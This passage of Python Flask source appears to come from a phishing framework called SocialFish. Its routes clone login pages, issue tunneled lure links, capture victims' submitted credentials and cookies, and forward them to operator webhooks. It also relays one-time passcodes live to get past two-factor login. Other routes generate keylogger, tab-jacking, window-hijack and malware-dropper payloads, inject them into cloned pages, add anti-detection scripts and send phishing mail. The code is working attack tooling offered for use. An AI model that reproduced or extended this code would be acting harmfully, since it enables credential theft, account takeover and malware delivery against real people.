        recorder = PlaywrightRecorder(DATABASE, headless=headless, stealth=stealth)
        # Store recorder session in g for tracking
        g.recorder = recorder
        
        return jsonify({
            'status': 'ok',
            'message': 'Recording started',
            'recorder_id': id(recorder)
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Recorder - Save template
@app.route("/recorder/save-template", methods=['POST'])
@flask_login.login_required
def save_template():
    """Save recording as a reusable template"""
    data = request.json or request.form
    template_name = data.get('name')
    description = data.get('description', '')
    tags = data.get('tags', '')
    clone_mode = data.get('clone_mode', 'both')
    
    if not template_name:
        return jsonify({'status': 'error', 'message': 'Template name required'}), 400
    
    try:
        cur = g.db
        cur.execute("""
            INSERT INTO templates(name, base_url, description, tags, clone_mode, created_by)
            VALUES(?, ?, ?, ?, ?, ?)
        """, (
            template_name,
            data.get('base_url', 'https://example.com'),
            description,
            tags,
            clone_mode,
            flask_login.current_user.id
        ))
        g.db.commit()
        template_id = cur.lastrowid
        
        return jsonify({
            'status': 'ok',
            'template_id': template_id,
            'message': f'Template saved: {template_name}'
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Templates - List all templates
@app.route("/templates", methods=['GET'])
@flask_login.login_required
def list_templates():
    """List all saved templates"""
    cur = g.db
    templates = cur.execute("SELECT id, name, base_url, description, tags, clone_mode, created_at FROM templates ORDER BY created_at DESC").fetchall()
    
    template_list = []
    for t in templates:
        template_list.append({
            'id': t[0],
            'name': t[1],
            'base_url': t[2],
            'description': t[3],
            'tags': t[4],
            'clone_mode': t[5],
            'created_at': t[6]
        })
    
    if request.headers.get('Accept') == 'application/json':
        return jsonify(template_list)
    
    return render_template('admin/templates.html', templates=template_list)

# Templates - Load template details
@app.route("/templates/<int:template_id>", methods=['GET'])
@flask_login.login_required
def get_template(template_id):
    """Get template details"""
    cur = g.db
    template = cur.execute("SELECT * FROM templates WHERE id = ?", (template_id,)).fetchone()
    
    if not template:
        return jsonify({'status': 'error', 'message': 'Template not found'}), 404
    
    return jsonify({
        'id': template[0],
        'name': template[1],
        'base_url': template[2],
        'description': template[3]
    })

# MITM & Tunneling - Configure tunnel for template
@app.route("/tunnel/setup", methods=['POST'])
@flask_login.login_required
def tunnel_setup():
    """Setup tunnel (ngrok/cloudflared) for a template"""
    data = request.json or request.form
    template_id = data.get('template_id')
    tunnel_type = data.get('tunnel_type', 'ngrok')  # ngrok or cloudflared
    tunnel_token = data.get('tunnel_token')
    
    if tunnel_type == 'ngrok' and tunnel_token:
        tunnel_url = tunnel_manager.start_ngrok_tunnel(
            local_port=5000,
            session_name=f"template_{template_id}"
        )
    elif tunnel_type == 'cloudflared':
        tunnel_url = tunnel_manager.start_cloudflared_tunnel(
            local_port=5000,
            session_name=f"template_{template_id}"
        )
    else:
        return jsonify({'status': 'error', 'message': 'Invalid tunnel type'}), 400
    
    if tunnel_url:
        # Store tunnel config in DB
        cur = g.db
        cur.execute("""
            INSERT OR REPLACE INTO mitm_config(template_id, tunnel_type, tunnel_token, tunnel_domain)
            VALUES(?, ?, ?, ?)
        """, (template_id, tunnel_type, tunnel_token, tunnel_url))
        g.db.commit()
        
        return jsonify({
            'status': 'ok',
            'tunnel_url': tunnel_url,
            'message': f'{tunnel_type} tunnel started'
        })
    
    return jsonify({'status': 'error', 'message': 'Failed to start tunnel'}), 500

# Lure URL - Generate phishing link
@app.route("/lure/generate", methods=['POST'])
@flask_login.login_required
def generate_lure():
    """Generate a lure URL for phishing campaign"""
    data = request.json or request.form
    template_id = data.get('template_id')
    
    if not template_id:
        return jsonify({'status': 'error', 'message': 'Template ID required'}), 400
    
    # Generate lure hash
    lure_hash = hashlib.sha256(f"{template_id}{date.today()}".encode()).hexdigest()[:16]
    
    # Get tunnel URL for this template
    cur = g.db
    tunnel_config = cur.execute("SELECT tunnel_domain FROM mitm_config WHERE template_id = ?", (template_id,)).fetchone()
    
    if tunnel_config and tunnel_config[0]:
        lure_url = f"{tunnel_config[0]}/capture/{lure_hash}"
    else:
        # Fallback to localhost if no tunnel configured
        lure_url = f"http://localhost:5000/capture/{lure_hash}"
    
    # Store lure URL in DB
    cur.execute("""
        INSERT INTO lure_urls(template_id, lure_hash, full_url)
        VALUES(?, ?, ?)
    """, (template_id, lure_hash, lure_url))
    g.db.commit()
    
    return jsonify({
        'status': 'ok',
        'lure_url': lure_url,
        'lure_hash': lure_hash
    })

# Victim Capture Page - Generic phishing form
@app.route("/capture/<lure_hash>", methods=['GET', 'POST'])
def victim_capture(lure_hash):
    """Generic victim capture page - responds with cloned page or form"""
    cur = g.db
    
    # Find template by lure hash
    lure_record = cur.execute("SELECT template_id FROM lure_urls WHERE lure_hash = ?", (lure_hash,)).fetchone()
    
    if not lure_record:
        return "Not found", 404
    
    template_id = lure_record[0]
    template = cur.execute("SELECT base_url, clone_mode FROM templates WHERE id = ?", (template_id,)).fetchone()
    
    if not template:
        return "Template not found", 404
    
    if request.method == 'POST':
        # Capture victim data
        form_data = request.form.to_dict()
        victim_ip = request.remote_addr
        victim_ua = request.headers.get('User-Agent', 'Unknown')
        
        # Create session record
        session_hash = hashlib.sha256(f"{lure_hash}{victim_ip}{date.today()}".encode()).hexdigest()[:16]
        
        cur.execute("""
            INSERT INTO sessions(template_id, session_hash, victim_ip, victim_ua, form_data, submitted_credentials)
            VALUES(?, ?, ?, ?, ?, ?)
        """, (
            template_id,
            session_hash,
            victim_ip,
            victim_ua,
            json.dumps(request.user_agent.__dict__ if hasattr(request, 'user_agent') else {}),
            json.dumps(form_data)
        ))
        g.db.commit()
        session_id = cur.lastrowid
        
        # Update lure click count
        cur.execute("UPDATE lure_urls SET click_count = click_count + 1 WHERE lure_hash = ?", (lure_hash,))
        g.db.commit()
        
        # Trigger webhooks for this template
        webhooks = cur.execute("SELECT webhook_url, webhook_type FROM webhooks WHERE template_id = ? AND enabled = 1", (template_id,)).fetchall()
        
        for webhook_url, webhook_type in webhooks:
            try:
                import requests
                payload = {
                    'session_id': session_id,
                    'victim_ip': victim_ip,
                    'form_data': form_data,
                    'timestamp': date.today().isoformat()
                }
                requests.post(webhook_url, json=payload, timeout=5)
            except (requests.RequestException, Exception) as e:
                print(f'[-] Webhook failed: {str(e)}')
        
        # Emit live notification via WebSocket
        socketio.emit('victim_submission', {
            'template_id': template_id,
            'session_id': session_id,
            'victim_ip': victim_ip,
            'timestamp': date.today().isoformat()
        }, broadcast=True)
        
        # Redirect to real site or OTP panel
        if template[1] == 'cookies':
            return redirect(template[0])  # Send to real site
        else:
            # Stay for OTP interception
            return render_template('admin/otp_panel.html', session_id=session_id, template_id=template_id)
    
    # GET - return cloned page
    if template[1] == 'clone':
        agent = request.headers.get('User-Agent', 'Unknown').encode('ascii', 'ignore').decode('ascii')
        # Sanitize agent to prevent path traversal
        agent = agent.replace('..', '').replace('/', '_').replace('\\', '_')
        clone(template[0], agent, 'no')  # Clone without BEEF
        o = template[0].replace('://', '-')
        template_path = f'fake/{agent}/{o}/index.html'
        try:
            return render_template(template_path)
        except Exception:
            return "Template not found", 404
    else:
        # Return custom template or generic form
        return render_template('custom.html')

# Live OTP Panel - WebSocket endpoint
@socketio.on('otp_listen')
def otp_listen(data):
    """Listen for OTP codes on victim's browser"""
    session_id = data.get('session_id')
    join_room(f"otp_{session_id}")
    emit('status', {'message': 'Listening for OTP'})

@socketio.on('otp_received')
def otp_received(data):
    """Operator received/received OTP code"""
    session_id = data.get('session_id')
    otp_code = data.get('otp_code')
    
    # Emit to victim's browser to inject OTP
    emit('inject_otp', {'otp_code': otp_code}, room=f"otp_{session_id}")
    
    # Log OTP event
    cur = g.db
    cur.execute("""
        INSERT INTO analyzer_logs(session_id, detection_type, detection_value)
        VALUES(?, ?, ?)
    """, (session_id, 'otp_injected', otp_code))
    g.db.commit()

# Webhook Management - Add/delete webhooks
@app.route("/webhooks", methods=['GET', 'POST'])
@flask_login.login_required
def manage_webhooks():
    """Add webhook notification for template"""
    if request.method == 'POST':
        data = request.json or request.form
        template_id = data.get('template_id')
        webhook_url = data.get('webhook_url')
        webhook_type = data.get('webhook_type', 'json')
        trigger_on = data.get('trigger_on', 'credential_submit')
        
        cur = g.db
        cur.execute("""
            INSERT INTO webhooks(template_id, webhook_url, webhook_type, trigger_on)
            VALUES(?, ?, ?, ?)
        """, (template_id, webhook_url, webhook_type, trigger_on))
        g.db.commit()
        
        return jsonify({'status': 'ok', 'message': 'Webhook added'})
    
    # GET - list webhooks
    cur = g.db
    webhooks = cur.execute("SELECT id, template_id, webhook_url, webhook_type, trigger_on FROM webhooks").fetchall()
    
    if request.headers.get('Accept') == 'application/json':
        return jsonify([{
            'id': w[0],
            'template_id': w[1],
            'webhook_url': w[2],
            'webhook_type': w[3],
            'trigger_on': w[4]
        } for w in webhooks])
    
    return render_template('admin/webhooks.html', webhooks=webhooks)

# Sessions - View captured sessions
@app.route("/sessions", methods=['GET'])
@flask_login.login_required
def list_sessions():
    """List all captured victim sessions"""
    cur = g.db
    sessions = cur.execute("""
        SELECT id, template_id, session_hash, victim_ip, victim_ua, submission_timestamp
        FROM sessions ORDER BY submission_timestamp DESC LIMIT 100
    """).fetchall()
    
    session_list = []
    for s in sessions:
        session_list.append({
            'id': s[0],
            'template_id': s[1],
            'session_hash': s[2],
            'victim_ip': s[3],
            'victim_ua': s[4],
            'timestamp': s[5]
        })
    
    if request.headers.get('Accept') == 'application/json':
        return jsonify(session_list)
    
    return render_template('admin/sessions.html', sessions=session_list)

# Session Details
@app.route("/session/<int:session_id>", methods=['GET'])
@flask_login.login_required
def get_session(session_id):
    """Get detailed session data"""
    cur = g.db
    session = cur.execute("""
        SELECT id, template_id, session_hash, victim_ip, victim_ua, form_data, submitted_credentials, submission_timestamp
        FROM sessions WHERE id = ?
    """, (session_id,)).fetchone()
    
    if not session:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
    
    # Get cookies
    cookies = cur.execute("SELECT name, value, domain, path FROM cookies WHERE session_id = ?", (session_id,)).fetchall()
    
    return jsonify({
        'id': session[0],
        'template_id': session[1],
        'session_hash': session[2],
        'victim_ip': session[3],
        'victim_ua': session[4],
        'form_data': json.loads(session[5] if session[5] else '{}'),
        'credentials': json.loads(session[6] if session[6] else '{}'),
        'timestamp': session[7],
        'cookies': [{
            'name': c[0],
            'value': c[1],
            'domain': c[2],
            'path': c[3]
        } for c in cookies]
    })

#================================================================================================================================

@app.route('/logout')
def logout():
    flask_login.logout_user()
    return 'Logged out'

@login_manager.unauthorized_handler
def unauthorized_handler():
    return 'Unauthorized'

#--------------------------------------------------------------------------------------------------------------------------------
# MOBILE API

# VERIFICAR CHAVE
@app.route("/api/checkKey/<key>", methods=['GET'])
def checkKey(key):
    cur = g.db
    ensure_socialfish_row(cur)
    tokenapi = sf_get(cur, 'token', '')
    if key == tokenapi:
        status = {'status':'ok'}
    else:
        status = {'status':'bad'}
    return jsonify(status)

@app.route("/api/statistics/<key>", methods=['GET'])
def getStatics(key):
    cur = g.db
    ensure_socialfish_row(cur)
    tokenapi = sf_get(cur, 'token', '')
    if key == tokenapi:
        cur = g.db
        attacks = sf_get(cur, 'attacks', 0)
        clicks = sf_get(cur, 'clicks', 0)
        countC = countCreds()
        countNPU = countNotPickedUp()
        info = {'status':'ok','attacks':attacks, 'clicks':clicks, 'countCreds':countC, 'countNotPickedUp':countNPU}
    else:
        info = {'status':'bad'}
    return jsonify(info)

@app.route("/api/getJson/<key>", methods=['GET'])
def getJson(key):
    cur = g.db
    ensure_socialfish_row(cur)
    tokenapi = sf_get(cur, 'token', '')
    if key == tokenapi:
        try:
            sql = "SELECT * FROM creds"
            cur = g.db
            credInfo = cur.execute(sql).fetchall()
            listCreds = []
            if len(credInfo) > 0:
                for c in credInfo:
                    cred = {'id':c[0],'url':c[1], 'post':c[2], 'date':c[3], 'browser':c[4], 'version':c[5],'os':c[6],'ip':c[7]}
                    listCreds.append(cred)
            else:
                credInfo = {'status':'nothing'}
            return jsonify(listCreds)
        except:
            return "Bad parameter"
    else:
        credInfo = {'status':'bad'}
        return jsonify(credInfo)

@app.route('/api/configure', methods = ['POST'])
def postConfigureApi():
    if request.is_json:
        content = request.get_json()
        cur = g.db
        ensure_socialfish_row(cur)
        tokenapi = sf_get(cur, 'token', '')
        if content.get('key') == tokenapi:
            red = content.get('red', 'https://github.com/UndeadSec/SocialFish')
            beef = content.get('beef', 'no')
            sta = content.get('sta', 'custom')
            
            if sta == 'clone':
                url = content.get('url', 'https://github.com/UndeadSec/SocialFish')
            else:
                url = 'Custom'

            if url != 'Custom':
                if len(url) > 4:
                    if 'http://' not in url and sta != '1' and 'https://' not in url:
                        url = 'http://' + url
            if len(red) > 4:
                if 'http://' not in red and 'https://' not in red:
                    red = 'http://' + red
            else:
                red = 'https://github.com/UndeadSec/SocialFish'
            
            # Store in database instead of global variables
            cur.execute("DELETE FROM config")
            cur.execute("INSERT INTO config(url, red, status, beef) VALUES(?, ?, ?, ?)",
                        (url, red, sta, beef))
            cur.execute("UPDATE socialfish SET attacks = attacks + 1 WHERE id = 1")
            g.db.commit()
            status = {'status':'ok'}
        else:
            status = {'status':'bad'}
    else:
        status = {'status':'bad'}
    return jsonify(status)

@app.route("/api/mail", methods=['POST'])
def postSendMail():
    if request.is_json:
        content = request.get_json()
        cur = g.db
        ensure_socialfish_row(cur)
        tokenapi = sf_get(cur, 'token', '')
        if content['key'] == tokenapi:
            subject = content['subject']
            email = content['email']
            password = content['password']
            recipient = content['recipient']
            body = content['body']
            smtp = content['smtp']
            port = content['port']
            if sendMail(subject, email, password, recipient, body, smtp, port) == 'ok':
                cur = g.db
                cur.execute("UPDATE sfmail SET email = ? WHERE id = 1", (email,))
                cur.execute("UPDATE sfmail SET smtp = ? WHERE id = 1", (smtp,))
                cur.execute("UPDATE sfmail SET port = ? WHERE id = 1", (port,))
                g.db.commit()
                status = {'status':'ok'}
            else:
                status = {'status':'bad','error':str(sendMail(subject, email, password, recipient, body, smtp, port))}
        else:
            status = {'status':'bad'}
    else:
        status = {'status':'bad'}
    return jsonify(status)

@app.route("/api/trace/<key>/<ip>", methods=['GET'])
def getTraceIpMob(key, ip):
    import re
    cur = g.db
    ensure_socialfish_row(cur)
    tokenapi = sf_get(cur, 'token', '')
    
    # Validate IP format
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$|^127\.0\.0\.1$|^::1$|^[a-f0-9:]+$'
    
    if not re.match(ip_pattern, ip):
        return jsonify({'status':'bad', 'error': 'Invalid IP format'})
    
    if key == tokenapi:
        try:
            traceIp = tracegeoIp(ip)
            return jsonify(traceIp)
        except Exception as e:
            print(f'[-] API trace error: {str(e)}')
            content = {'status':'bad', 'error': 'Trace failed'}
            return jsonify(content)
    else:
        content = {'status':'bad'}
        return jsonify(content)

@app.route("/api/scansf/<key>/<ip>", methods=['GET'])
def getScanSfMob(key, ip):
    import re
    cur = g.db
    ensure_socialfish_row(cur)
    tokenapi = sf_get(cur, 'token', '')
    
    # Validate IP format
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$|^127\.0\.0\.1$|^::1$|^[a-f0-9:]+$'
    
    if not re.match(ip_pattern, ip):
        return jsonify({'status':'bad', 'error': 'Invalid IP format'})
    
    if key == tokenapi:
        try:
            return jsonify(nScan(ip))
        except Exception as e:
            print(f'[-] API scan error: {str(e)}')
            return jsonify({'status':'bad', 'error': 'Scan failed'})
    else:
        content = {'status':'bad'}
        return jsonify(content)

@app.route("/api/infoReport/<key>", methods=['GET'])
def getReportMob(key):
    cur = g.db
    ensure_socialfish_row(cur)
    tokenapi = sf_get(cur, 'token', '')
    if key == tokenapi:
        urls = cur.execute("SELECT url FROM creds").fetchall()
        users = cur.execute("SELECT name FROM professionals").fetchall()
        comp = cur.execute("SELECT name FROM companies").fetchall()
        uniqueUrls = []
        professionals = []
        companies = []
        for c in comp:
            companies.append(c[0])
        for p in users:
            professionals.append(p[0])
        for u in urls:
            if u not in uniqueUrls:
                uniqueUrls.append(u[0])
        info = {'urls':uniqueUrls,'professionals':professionals, 'companies':companies}
        return jsonify(info)
    else:
        return jsonify({'status':'bad'})

#================================================================================================================================
# ADVANCED ATTACK TECHNIQUES (v3.0+)

# Selenium Browser Control
@app.route("/selenium/record", methods=['POST'])
@flask_login.login_required
def selenium_record():
    """Start Selenium recording session"""
    data = request.json or request.form
    target_url = data.get('url')
    browser = data.get('browser', 'chrome')
    headless = data.get('headless', 'true').lower() == 'true'
    
    try:
        recorder = SeleniumRecorder(browser=browser, headless=headless)
        recorder.init_driver()
        
        return jsonify({
            'status': 'ok',
            'message': 'Selenium recording started',
            'browser': browser,
            'headless': headless
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Tab Jacking - Hijack victim's browser tab
@app.route("/attack/tabjack", methods=['POST'])
@flask_login.login_required
def tab_jacking():
    """Generate tab jacking payload"""
    data = request.json or request.form
    target_url = data.get('target_url')
    clone_url = data.get('clone_url')
    
    if data.get('type') == 'html':
        payload = TabJacking.generate_tabjack_html(clone_url, target_url)
        return render_template_string(payload)
    else:
        payload = TabJacking.generate_tabjack_payload(target_url)
        return jsonify({
            'status': 'ok',
            'payload': payload,
            'type': 'javascript'
        })

# File Upload Injection - Drop malicious files
@app.route("/attack/file-upload", methods=['POST'])
@flask_login.login_required
def file_upload_injection():
    """Generate file upload/malware dropper payload"""
    data = request.json or request.form
    file_url = data.get('file_url')
    filename = data.get('filename', 'update.exe')
    malware_mode = data.get('malware_mode', 'false').lower() == 'true'
    
    if malware_mode:
        payload = FileUploadInjection.generate_malware_dropper_html(file_url)
        return render_template_string(payload)
    else:
        payload = FileUploadInjection.generate_file_upload_payload(file_url, filename)
        return jsonify({
            'status': 'ok',
            'payload': payload,
            'type': 'javascript'
        })

# Advanced Stealth - Anti-detection techniques
@app.route("/attack/stealth", methods=['GET', 'POST'])
@flask_login.login_required
def advanced_stealth():
    """Get stealth evasion payloads"""
    stealth_type = request.args.get('type', 'perfection')
    
    if stealth_type == 'perfection':
        payload = AdvancedStealth.generate_perfection_js()
    elif stealth_type == 'fingerprint':
        payload = AdvancedStealth.generate_fingerprint_evasion()
    else:
        return jsonify({'status': 'error', 'message': 'Unknown stealth type'}), 400
    
    return jsonify({
        'status': 'ok',
        'stealth_type': stealth_type,
        'payload': payload,
        'size': len(payload),
        'description': 'Inject into cloned page to evade detection'
    })

# CAPTCHA Detection & Solving
@app.route("/attack/captcha/detect", methods=['POST'])
@flask_login.login_required
def captcha_detect():
    """Detect CAPTCHA on page"""
    data = request.json or request.form
    page_html = data.get('html')
    
    if not page_html:
        return jsonify({'status': 'error', 'message': 'HTML required'}), 400
    
    solver = CAPTCHASolver()
    detections = solver.detect_captcha(page_html, [])
    
    return jsonify({
        'status': 'ok',
        'detections': detections,
        'has_captcha': detections['has_captcha'],
        'captcha_type': detections['captcha_type']
    })

# CAPTCHA Solving Setup
@app.route("/attack/captcha/solve", methods=['POST'])
@flask_login.login_required
def captcha_solve():
    """Setup CAPTCHA solving service"""
    data = request.json or request.form
    service = data.get('service', '2captcha')  # 2captcha, anticaptcha, manual
    api_key = data.get('api_key')
    
    try:
        solver = CAPTCHASolver(service=service, api_key=api_key)
        
        # Store solver config in DB (future enhancement)
        return jsonify({
            'status': 'ok',
            'service': service,
            'message': f'CAPTCHA solver configured: {service}'
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Mock Login Server - Test environment
@app.route("/mock-server/start", methods=['POST'])
@flask_login.login_required
def mock_server_start():
    """Start mock login server for testing"""
    data = request.json or request.form
    port = data.get('port', 5001)
    
    try:
        # Start mock server in background thread
        import threading
        server = MockLoginServer(port=port)
        
        thread = threading.Thread(target=server.run, daemon=True)
        thread.start()
        
        return jsonify({
            'status': 'ok',
            'port': port,
            'message': f'Mock server started on port {port}',
            'endpoints': {
                'login': f'http://localhost:{port}/login',
                'oauth': f'http://localhost:{port}/oauth/authorize',
                'sso': f'http://localhost:{port}/sso/login',
                'api_users': f'http://localhost:{port}/api/users',
                'api_sessions': f'http://localhost:{port}/api/sessions'
            }
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Recording Studio - Choose recorder type
def emit_recording_log(event_type, message, **kwargs):
    """Emit recording events to connected clients via WebSocket"""
    try:
        socketio.emit(event_type, {
            'message': message,
            'type': event_type,
            'timestamp': datetime.datetime.now().isoformat(),
            **kwargs
        }, broadcast=False)
    except Exception as e:
        logger.debug(f"Failed to emit WebSocket event {event_type}: {e}")

@app.route("/studio/recorder", methods=['GET', 'POST'])
@flask_login.login_required
def recording_studio():
    """Recording studio to choose between Playwright and Selenium"""
    if request.method == 'GET':
        return render_template('admin/recording_studio.html')
    
    # POST - start recording
    data = request.json or request.form
    recorder_type = data.get('type', 'playwright')  # playwright or selenium
    target_url = data.get('url')
    browser = data.get('browser', 'chrome')
    headless = data.get('headless', 'true').lower() == 'true'
    
    if not target_url:
        return jsonify({'status': 'error', 'message': 'URL required'}), 400
    
    try:
        if recorder_type == 'selenium':
            emit_recording_log('recorder_log', f"Initializing Selenium recorder ({browser})")
            recorder = SeleniumRecorder(browser=browser, headless=headless)
            recorder.init_driver()
            emit_recording_log('recorder_log', "Browser driver initialized")
            success = recorder.record_flow(target_url)
            emit_recording_log('recorder_log', f"Recording completed (found {len(recorder.detected_forms or [])} forms)")
        else:
            # Default Playwright
            emit_recording_log('recorder_log', "Initializing Playwright recorder")
            recorder = PlaywrightRecorder(DATABASE, headless=headless)
            emit_recording_log('recorder_log', "Launching browser instance")
            success = asyncio.run(recorder.record_flow(target_url))
            emit_recording_log('recorder_log', f"Recording completed (found {len(recorder.detected_forms or [])} forms)")
        
        return jsonify({
            'status': 'ok',
            'recorder_type': recorder_type,
            'message': f'Recording started with {recorder_type}'
        })
    except Exception as e:
        emit_recording_log('recording_error', str(e))
        logger.exception(f"Recording error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Attack Payloads Dashboard
@app.route("/admin/attack-payloads", methods=['GET'])
@flask_login.login_required
def attack_payloads():
    """Advanced attack payload generation dashboard"""
    return render_template('admin/attack_payloads.html')

# API: Generate Tab Jacking Payload
@app.route("/api/attacks/tabjack", methods=['POST'])
@flask_login.login_required
def generate_tabjack():
    """Generate tab jacking payload"""
    data = request.json
    redirect_url = data.get('redirect_url')
    delay_ms = data.get('delay_ms', 500)
    
    if not redirect_url:
        return jsonify({'status': 'error', 'message': 'redirect_url required'}), 400
    
    from core.advanced_attacks import AdvancedAttackInjector
    payload = AdvancedAttackInjector.generate_tab_jacker(redirect_url, delay_ms=delay_ms)
    
    return jsonify({
        'status': 'ok',
        'payload_type': 'tab_jacking',
        'payload': payload
    })

# API: Generate Window Hijack Payload
@app.route("/api/attacks/window-hijack", methods=['POST'])
@flask_login.login_required
def generate_window_hijack():
    """Generate aggressive window hijacking payload"""
    data = request.json
    redirect_url = data.get('redirect_url')
    
    if not redirect_url:
        return jsonify({'status': 'error', 'message': 'redirect_url required'}), 400
    
    from core.advanced_attacks import AdvancedAttackInjector
    payload = AdvancedAttackInjector.generate_window_hijack(redirect_url)
    
    return jsonify({
        'status': 'ok',
        'payload_type': 'window_hijack',
        'payload': payload
    })

# API: Generate Keylogger Payload
@app.route("/api/attacks/keylogger", methods=['POST'])
@flask_login.login_required
def generate_keylogger():
    """Generate keylogger injection payload"""
    data = request.json
    webhook_url = data.get('webhook_url', '/api/webhook')
    
    from core.advanced_attacks import AdvancedAttackInjector
    payload = AdvancedAttackInjector.generate_keylogger(webhook_url)
    
    return jsonify({
        'status': 'ok',
        'payload_type': 'keylogger',
        'payload': payload
    })

# API: Generate File Download Injection
@app.route("/api/attacks/file-download", methods=['POST'])
@flask_login.login_required
def generate_file_download():
    """Generate file download injection payload"""
    data = request.json
    file_url = data.get('file_url')
    filename = data.get('filename', 'document.pdf')
    
    if not file_url:
        return jsonify({'status': 'error', 'message': 'file_url required'}), 400
    
    from core.advanced_attacks import AdvancedAttackInjector
    payload = AdvancedAttackInjector.generate_file_download_injection(file_url, filename)
    
    return jsonify({
        'status': 'ok',
        'payload_type': 'file_download',
        'payload': payload
    })

# API: Generate Multi-Vector Attack
@app.route("/api/attacks/multi-vector", methods=['POST'])
@flask_login.login_required
def generate_multi_vector():
    """Generate combined multi-vector attack"""
    data = request.json
    capture_url = data.get('capture_url')
    webhook_url = data.get('webhook_url', '/api/webhook')
    file_download_url = data.get('file_download_url')
    
    if not capture_url:
        return jsonify({'status': 'error', 'message': 'capture_url required'}), 400
    
    from core.advanced_attacks import AttackTemplateBuilder
    attacks = AttackTemplateBuilder.build_multi_vector_attack(
        capture_url,
        webhook_url,
        file_download_url
    )
    
    return jsonify({
        'status': 'ok',
        'payload_type': 'multi_vector',
        'individual_payloads': attacks['individual_payloads'],
        'combined_script': attacks['combined_script'],
        'injection_methods': attacks['injection_methods']
    })

# API: Inject Payload into Template
@app.route("/api/attacks/inject-template", methods=['POST'])
@flask_login.login_required
def inject_payload_to_template():
    """Inject attack payload into clone template"""
    data = request.json
    template_id = data.get('template_id')
    payload = data.get('payload')
    injection_method = data.get('injection_method', 'html_script_injection')
    
    if not template_id or not payload:
        return jsonify({'status': 'error', 'message': 'template_id and payload required'}), 400
    
    try:
        cur = g.db
        
        # Get template
        template = cur.execute(
            "SELECT cloned_html FROM templates WHERE id = ?",
            (template_id,)
        ).fetchone()
        
        if not template:
            return jsonify({'status': 'error', 'message': 'Template not found'}), 404
        
        from core.advanced_attacks import InjectionMethods
        
        cloned_html = template[0]
        
        if injection_method == 'dom_ready':
            modified_html = InjectionMethods.dom_ready_injection(cloned_html, payload)
        elif injection_method == 'inline_event':
            modified_html = InjectionMethods.inline_event_injection(cloned_html, payload)
        else:  # html_script_injection
            modified_html = InjectionMethods.html_script_injection(cloned_html, payload)
        
        # Update template with injected code
        cur.execute(
            "UPDATE templates SET cloned_html = ? WHERE id = ?",
            (modified_html, template_id)
        )
        g.db.commit()
        
        return jsonify({
            'status': 'ok',
            'message': f'Payload injected using {injection_method}',
            'modified': True
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# API: Webhook Handler - Receive attack data
@app.route("/api/webhook", methods=['POST'])
def webhook_handler():
    """Receive attack-generated data (keystrokes, form data, etc.)"""
    data = request.json or request.form.to_dict()
    
    # This would be called by injected JavaScript payloads
    webhook_type = data.get('type')
    victim_ip = request.remote_addr
    
    # Log to console
    print(f"[+] Webhook data received from {victim_ip}: {webhook_type}")
    
    # Broadcast to admin panel via WebSocket
    # Avoid passing `broadcast` keyword directly to ensure compatibility
    payload = {
        'type': webhook_type,
        'victim_ip': victim_ip,
        'data': data,
        'timestamp': date.today().isoformat()
    }
    try:
        socketio.emit('webhook_data', payload)
    except TypeError:
        # Fallback for older/newer server implementations
        socketio.server.emit('webhook_data', payload)
    
    return jsonify({'status': 'ok'})

#================================================================================================================================
def main():
        if version_info<(3,0,0):
            print('[!] Please use Python 3. $ python3 SocialFish.py')
            exit(0)
        head()
        cleanFake()
        # Inicia o banco e executa migracao
        initDB(DATABASE)
        migrate_db(DATABASE)
        # Inicia o servidor com SocketIO
        host = os.environ.get("SOCIALFISH_HOST", "0.0.0.0")
        port = int(os.environ.get("SOCIALFISH_PORT", "5000"))
        socketio.run(app, host=host, port=port, debug=False)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit(0)
